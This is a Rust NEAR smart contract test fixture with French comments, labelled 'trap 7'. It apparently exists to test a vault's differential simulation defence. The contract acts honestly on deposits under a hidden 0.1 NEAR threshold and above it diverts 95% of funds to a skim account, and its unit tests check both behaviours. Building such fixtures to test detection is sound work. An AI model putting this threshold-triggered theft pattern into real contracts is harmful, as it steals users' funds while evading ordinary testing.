//! Piège 7 : `two-face.test.near` — honnête sous 0,1 NEAR, voleur au-dessus.
//!
//! C'est le contrat qui justifie la **simulation différentielle** (règle R12) :
//! il se comporte correctement sur les petits montants — ceux qu'un simulateur
//! naïf ou un test unitaire essaierait — et détourne les fonds dès que le
//! montant dépasse un seuil caché.
//!
//! Appelé par le coffre via `VaultAction::Call { method_name: "trap", deposit }`.

use near_sdk::json_types::U128;
use near_sdk::{env, near, AccountId, Gas, NearToken, PanicOnDefault, Promise};

/// Symbole du seul jeton échangé.
pub const SYMBOL: &str = "TEST";
/// Seuil caché : en dessous, le contrat est honnête (0,1 NEAR).
pub const SEUIL: u128 = 10u128.pow(23);
/// Rendu honnête sous le seuil : 95 % du dépôt, exprimé en TEST (18 décimales).
pub const TAUX_HONNETE: u128 = 95;
/// Rendu volé au-dessus du seuil : 5 % seulement.
pub const TAUX_VOLE: u128 = 5;
/// Gas laissé au transfert de jetons.
const GAS_FOR_FT_TRANSFER: Gas = Gas::from_tgas(10);

/// État du piège.
#[near(contract_state)]
#[derive(PanicOnDefault)]
pub struct TwoFace {
    owner_id: AccountId,
    token_id: AccountId,
    /// Réserve interne de TEST, en unités de base.
    reserve: u128,
    /// Compte qui reçoit la part détournée.
    skim_to: AccountId,
}

#[near]
impl TwoFace {
    /// Crée le piège avec son jeton et le compte de détournement.
    #[init]
    pub fn new(owner_id: AccountId, token_id: AccountId, skim_to: AccountId) -> Self {
        Self {
            owner_id,
            token_id,
            reserve: 0,
            skim_to,
        }
    }

    /// Échange à deux visages : honnête sous le seuil, voleur au-dessus.
    #[payable]
    pub fn trap(&mut self, args: String) -> bool {
        let depot = env::attached_deposit().as_yoctonear();
        if depot == 0 {
            env::panic_str("Depot nul");
        }
        let (pour_l_appelant, pour_le_tiers) = self.repartition(depot);
        if pour_l_appelant + pour_le_tiers > self.reserve {
            env::panic_str("Reserve insuffisante");
        }
        self.reserve -= pour_l_appelant + pour_le_tiers;

        let appelant = env::predecessor_account_id();
        env::log_str(&format!(
            "two-face: depot={} seuil={} honnete={} appelant={} tiers={} (args: {})",
            depot,
            SEUIL,
            depot < SEUIL,
            pour_l_appelant,
            pour_le_tiers,
            args
        ));
        self.verser(&appelant, pour_l_appelant);
        if pour_le_tiers > 0 {
            self.verser(&self.skim_to.clone(), pour_le_tiers);
        }
        true
    }

    /// Réapprovisionnement de la réserve par le propriétaire.
    pub fn fund(&mut self, amount: U128) {
        if env::predecessor_account_id() != self.owner_id {
            env::panic_str("Seul le proprietaire peut approvisionner");
        }
        self.reserve = self.reserve.saturating_add(amount.0);
    }

    /// Réserve actuelle.
    pub fn reserve(&self) -> U128 {
        U128(self.reserve)
    }

    /// Seuil caché (exposé pour la démonstration, pas pour le contrat lui-même).
    pub fn seuil(&self) -> U128 {
        U128(SEUIL)
    }
}

impl TwoFace {
    /// Part rendue à l'appelant et part détournée, selon le montant du dépôt.
    ///
    /// Le dépôt est en yoctoNEAR (24 décimales) et le jeton en unités de base
    /// (18 décimales) : on convertit pour garder des ordres de grandeur lisibles.
    fn repartition(&self, depot: u128) -> (u128, u128) {
        // 1 NEAR (10^24 yocto) vaut 10^18 unités de base du jeton.
        let base = depot / 10u128.pow(6);
        if depot < SEUIL {
            // Sous le seuil : 95 % du dépôt, rien de détourné.
            (base * TAUX_HONNETE / 100, 0)
        } else {
            // Au-dessus : 100 % convertis, mais 95 % partent au tiers.
            let vole = base * (100 - TAUX_VOLE) / 100;
            (base - vole, vole)
        }
    }

    /// Transfère des jetons depuis la réserve du contrat.
    fn verser(&self, destinataire: &AccountId, montant: u128) {
        if montant == 0 {
            return;
        }
        let payload = serde_json::json!({
            "receiver_id": destinataire,
            "amount": U128(montant),
        });
        let bytes = match serde_json::to_vec(&payload) {
            Ok(bytes) => bytes,
            Err(_) => env::panic_str("Arguments non serialisables"),
        };
        Promise::new(self.token_id.clone())
            .function_call(
                "ft_transfer".to_string(),
                bytes,
                NearToken::from_yoctonear(1),
                GAS_FOR_FT_TRANSFER,
            )
            .detach();
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use near_sdk::test_utils::VMContextBuilder;
    use near_sdk::testing_env;

    fn id(name: &str) -> AccountId {
        name.parse().expect("compte valide")
    }

    fn contexte(appelant: &str, depot: u128) {
        let ctx = VMContextBuilder::new()
            .current_account_id(id("two-face.test.near"))
            .predecessor_account_id(id(appelant))
            .signer_account_id(id(appelant))
            .attached_deposit(NearToken::from_yoctonear(depot))
            .build();
        testing_env!(ctx);
    }

    fn contrat() -> TwoFace {
        contexte("owner.test.near", 0);
        let mut contrat = TwoFace::new(
            id("owner.test.near"),
            id("test-token.test.near"),
            id("mallory.test.near"),
        );
        contrat.fund(U128(10u128.pow(24)));
        contrat
    }

    #[test]
    fn sous_le_seuil_le_contrat_est_honnete() {
        let mut contrat = contrat();
        let depot = SEUIL / 2;
        let (appelant, tiers) = contrat.repartition(depot);
        assert!(tiers == 0, "rien ne doit être détourné sous le seuil");
        assert!(appelant > 0);
        contexte("vault.test.near", depot);
        assert!(contrat.trap(String::new()));
    }

    #[test]
    fn au_dessus_du_seuil_le_contrat_detourne() {
        let contrat = contrat();
        let depot = SEUIL * 4;
        let (appelant, tiers) = contrat.repartition(depot);
        assert!(tiers > 0, "la part détournée doit être non nulle");
        assert!(
            tiers > appelant * 10,
            "l'essentiel doit partir au tiers : {appelant} vs {tiers}"
        );
    }

    #[test]
    fn les_deux_visages_divergent_sur_le_meme_contrat() {
        let contrat = contrat();
        let petit = contrat.repartition(SEUIL / 10);
        let gros = contrat.repartition(SEUIL * 10);
        let taux_petit = petit.0 * 1000 / (SEUIL / 10 / 10u128.pow(6));
        let taux_gros = gros.0 * 1000 / (SEUIL * 10 / 10u128.pow(6));
        assert!(
            taux_petit > taux_gros,
            "le taux doit diverger : {taux_petit} vs {taux_gros}"
        );
    }

    #[test]
    fn approvisionnement_reserve_au_proprietaire() {
        let mut contrat = contrat();
        contexte("mallory.test.near", 0);
        let resultat =
            std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| contrat.fund(U128(1))));
        assert!(resultat.is_err());
    }

    #[test]
    fn depot_nul_refuse() {
        let mut contrat = contrat();
        contexte("vault.test.near", 0);
        let resultat =
            std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| contrat.trap(String::new())));
        assert!(resultat.is_err());
    }
}
